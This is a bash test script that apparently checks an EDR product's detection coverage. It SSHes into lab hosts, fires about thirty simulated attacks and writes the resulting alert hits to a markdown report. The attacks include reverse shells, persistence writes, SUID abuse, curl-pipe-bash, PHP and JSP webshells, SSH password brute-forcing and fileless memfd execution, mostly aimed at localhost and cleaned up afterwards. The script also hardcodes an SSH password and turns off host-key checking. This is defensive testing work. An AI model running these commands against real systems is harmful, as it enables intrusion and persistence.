#!/usr/bin/env bash
# L1 EDR 最终重跑 (PR #258 + #260 后): 31 样本, keyword 涵盖中文 title.
set -uo pipefail
ROCKY_IP="${ROCKY_IP:-192.168.254.109}"
CENTOS_IP="${CENTOS_IP:-192.168.254.114}"
MGR="${MGR:-http://localhost:8080}"
JWT=$(/bin/cat /tmp/mxsec-jwt)
CURL="/usr/bin/curl"
JQ="/usr/bin/jq"

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5"
RSH_SUDO() { sshpass -p centos ssh -tt $SSH_OPTS centos@"$1" "echo centos | sudo -S sh -c '$2'" 2>&1 | grep -v 'sudo:'; }
RSH() { sshpass -p centos ssh $SSH_OPTS centos@"$1" "$2"; }

REPORT_DIR="docs/functional-test-2026-06-08"
mkdir -p "$REPORT_DIR"
REPORT="$REPORT_DIR/l1-edr-detection-final.md"

PASS=0; FAIL=0
declare -a ROWS

trigger_and_check() {
  local name="$1" ip="$2" cmd="$3" kw="$4" use_sudo="${5:-no}"
  local start_ts=$(date '+%Y-%m-%d %H:%M:%S')
  if [ "$use_sudo" = "yes" ]; then
    RSH_SUDO "$ip" "$cmd" >/dev/null 2>&1 || true
  else
    RSH "$ip" "$cmd" >/dev/null 2>&1 || true
  fi
  sleep 14
  local hits=$($CURL -s -H "Authorization: Bearer $JWT" "$MGR/api/v1/alerts?page=1&page_size=80" \
    | $JQ -r --arg kw "$kw" --arg t0 "$start_ts" '[(.data.items // [])[] | select((.last_seen_at // "") >= $t0) | select((.title // "") | test($kw;"i")) | .rule_id] | unique | join(",")')
  if [ -n "$hits" ]; then
    PASS=$((PASS+1)); ROWS+=("| $name | $ip | PASS | $hits |"); echo "[PASS] $name → $hits"
  else
    FAIL=$((FAIL+1)); ROWS+=("| $name | $ip | FAIL | — |"); echo "[FAIL] $name"
  fi
}

echo "=== L1 EDR 最终重跑 ==="
echo "Time: $(date)"
echo

# 反弹 shell 5
trigger_and_check "bash /dev/tcp 反弹" "$ROCKY_IP" "bash -c '(bash -i >/dev/tcp/127.0.0.1/1 0>&1) &' ; sleep 1; pkill -f 'bash -i' || true" "反弹|reverse|bash"
trigger_and_check "nc 反弹 shell" "$ROCKY_IP" "(rm -f /tmp/_f; mkfifo /tmp/_f; cat /tmp/_f | /bin/sh -i 2>&1 | nc 127.0.0.1 1 >/tmp/_f) >/dev/null 2>&1 & sleep 1; pkill -f mkfifo || true; rm -f /tmp/_f" "反弹|reverse|nc|ncat"
trigger_and_check "perl 反弹" "$ROCKY_IP" "perl -e 'use Socket; socket(S,2,1,6); connect(S,sockaddr_in(1,inet_aton(\"127.0.0.1\"))) or exit; exec \"/bin/sh\";' >/dev/null 2>&1 || true" "反弹|reverse|perl"
trigger_and_check "openssl 加密反弹" "$ROCKY_IP" "timeout 2 openssl s_client -quiet -connect 127.0.0.1:1 -no_ign_eof 2>/dev/null < /dev/null || true" "反弹|reverse|openssl"

# 持久化 6
trigger_and_check "cron 写 (sudo)" "$ROCKY_IP" "echo \"* * * * * root /tmp/mxsec-test.sh\" > /etc/cron.d/mxsec-fin-\$\$ && rm -f /etc/cron.d/mxsec-fin-\$\$" "cron|持久化|定时|启动项|persistence" yes
trigger_and_check "systemd 服务 (sudo)" "$ROCKY_IP" "echo \"[Unit]\nDescription=mxsec-fin\" > /etc/systemd/system/mxsec-fin.service && rm -f /etc/systemd/system/mxsec-fin.service" "systemd|启动项|持久化|persistence" yes
trigger_and_check "rc.local (sudo)" "$ROCKY_IP" "echo \"#!/bin/sh\" > /etc/rc.local && chmod +x /etc/rc.local && rm -f /etc/rc.local" "rc.local|启动项|持久化" yes
trigger_and_check "bashrc 写 ×10 (tee)" "$ROCKY_IP" "for i in 1 2 3 4 5 6 7 8 9 10; do echo \"export MXSEC_FIN_\$i=1\" | tee -a ~/.bashrc > /dev/null; done; sed -i '/MXSEC_FIN/d' ~/.bashrc" "bashrc|profile|持久化"
trigger_and_check "authorized_keys 写" "$ROCKY_IP" "mkdir -p ~/.ssh; for i in 1 2 3; do echo \"ssh-rsa AAAAB3NzaC1yc2EmxsecFIN\$i test\" >> ~/.ssh/authorized_keys; done; sed -i '/mxsecFIN/d' ~/.ssh/authorized_keys" "ssh|authorized|keys|persistence"
trigger_and_check "ld.so.preload (sudo)" "$ROCKY_IP" "echo /tmp/evil.so > /etc/ld.so.preload && rm -f /etc/ld.so.preload" "preload|ld.so|持久化|防御" yes

# 提权 4
trigger_and_check "sudo bash -c ×5" "$ROCKY_IP" "for i in 1 2 3 4 5; do echo wrong | sudo -S bash -c whoami 2>&1 | head -1; sleep 1; done" "sudo|权限提升|提权"
trigger_and_check "su root 失败" "$ROCKY_IP" "echo wrong | su root -c whoami 2>&1 | head -1 || true" "su|提权|权限提升|登录失败"
trigger_and_check "SUID 创建 + exec (sudo)" "$ROCKY_IP" "cp /bin/bash /tmp/mxsec-suid-fin && chmod u+s /tmp/mxsec-suid-fin && /tmp/mxsec-suid-fin -c whoami; rm -f /tmp/mxsec-suid-fin" "suid|提权|权限提升|privilege" yes
trigger_and_check "setcap (sudo)" "$ROCKY_IP" "cp /bin/bash /tmp/mxsec-cap-fin && /usr/sbin/setcap cap_net_admin+ep /tmp/mxsec-cap-fin; getcap /tmp/mxsec-cap-fin; rm -f /tmp/mxsec-cap-fin" "setcap|capability|权限提升|提权" yes

# 横向 4
trigger_and_check "ssh 链式登录" "$ROCKY_IP" "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -o BatchMode=yes nobody@127.0.0.1 'whoami' 2>&1 | head -1 || true" "ssh|横向|lateral"
trigger_and_check "wget+exec" "$ROCKY_IP" "wget -q -O /tmp/mxsec-wget-fin http://127.0.0.1:1/ 2>&1; rm -f /tmp/mxsec-wget-fin" "wget|download|横向"
trigger_and_check "curl pipe bash" "$ROCKY_IP" "curl -s http://127.0.0.1:1/inst.sh 2>&1 | bash >/dev/null 2>&1; bash -c 'echo simu'" "curl|管道|download|横向"
trigger_and_check "scp 反弹" "$ROCKY_IP" "scp -o StrictHostKeyChecking=no -o ConnectTimeout=2 -o BatchMode=yes /etc/hosts nobody@127.0.0.1:/tmp/ 2>&1 | head -1 || true" "scp|横向|lateral"

# 信息收集 3
trigger_and_check "用户枚举" "$ROCKY_IP" "id; whoami; w; last | head -5; cat /etc/passwd | wc -l" "信息|discover|recon|enumerate|枚举"
trigger_and_check "网络枚举" "$ROCKY_IP" "netstat -tunlp 2>/dev/null | head; ss -tunlp | head; route -n; arp -a 2>/dev/null | head" "netstat|信息|网络|discover|枚举"
trigger_and_check "kernel info" "$ROCKY_IP" "uname -a; cat /proc/version; cat /etc/os-release; lsmod | head" "kernel|信息|discover|枚举"

# 进程异常 2
trigger_and_check "fork bomb 100 echo (Agent 聚合)" "$ROCKY_IP" "for i in \$(seq 1 100); do /usr/bin/echo \$i > /dev/null; done; sleep 12" "fork|进程异常|impact|大量"
trigger_and_check "kthread 伪装 (exec -a)" "$ROCKY_IP" "for i in 1 2 3; do (exec -a '[kworker/mxsecFIN\$i:0]' sleep 3) & done; wait" "kworker|伪装|防御绕过|kthread"

# WebShell 3
trigger_and_check "PHP webshell" "$ROCKY_IP" "echo '<?php @eval(\$_POST[\"cmd\"]); ?>' > /tmp/mxsec-shell-fin.php; rm -f /tmp/mxsec-shell-fin.php" "webshell|php|文件"
trigger_and_check "JSP webshell" "$ROCKY_IP" "echo '<%@ page import=\"java.util.*,java.io.*\"%><% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>' > /tmp/mxsec-shell-fin.jsp; rm -f /tmp/mxsec-shell-fin.jsp" "webshell|jsp|文件"
trigger_and_check "WSO 大马" "$ROCKY_IP" "echo 'wso25_marker_eval base64_decode str_rot13 system' > /tmp/mxsec-wso-fin.php; rm -f /tmp/mxsec-wso-fin.php" "wso|webshell|文件"

# DNS + SSH 暴破
trigger_and_check "DNS 隧道 30 query" "$ROCKY_IP" "for i in \$(seq 1 30); do dig +short +timeout=1 mxsec-fin-\$i.invalid 2>/dev/null; done" "dns|tunnel|隧道|信息"
trigger_and_check "SSH 弱口令暴破 ×8" "$ROCKY_IP" "for p in 123456 admin password root abc123 qwerty test 123abc; do sshpass -p \$p ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -o BatchMode=no root@127.0.0.1 whoami 2>&1 | head -1; done" "ssh|brute|弱口令|登录失败"

# 内存攻击
trigger_and_check "memfd_create fileless" "$ROCKY_IP" "python3 -c 'import ctypes, os; libc=ctypes.CDLL(\"libc.so.6\"); fd=libc.memfd_create(b\"mxsec\",0); os.write(fd, b\"#!/bin/sh\necho hi\"); os.execve(\"/proc/self/fd/{}\".format(fd), [\"mxsec\"], os.environ)' 2>&1 | head" "memfd|fileless|防御绕过|内存"

# centos7 复测
trigger_and_check "centos7 bash /dev/tcp" "$CENTOS_IP" "bash -c '(bash -i >/dev/tcp/127.0.0.1/1 0>&1) &' ; sleep 1; pkill -f 'bash -i' || true" "反弹|reverse|bash"

# 报告
{
  echo "# L1 EDR 检测覆盖 final (2026-06-08)"
  echo
  echo "PR #258 (4 CEL 规则) + PR #260 (comm 字段 + kthread cmdline 兜底) 后最终重跑."
  echo
  echo "**触发样本: $((PASS+FAIL)) / PASS: $PASS / FAIL: $FAIL / 命中率: $((PASS*100/(PASS+FAIL)))%**"
  echo
  echo "| 样本 | 主机 | 结果 | 命中规则 |"
  echo "|---|---|---|---|"
} > "$REPORT"
for r in "${ROWS[@]}"; do echo "$r" >> "$REPORT"; done

echo
echo "=== L1 EDR final PASS=$PASS FAIL=$FAIL = $((PASS*100/(PASS+FAIL)))% ==="
echo "报告: $REPORT"
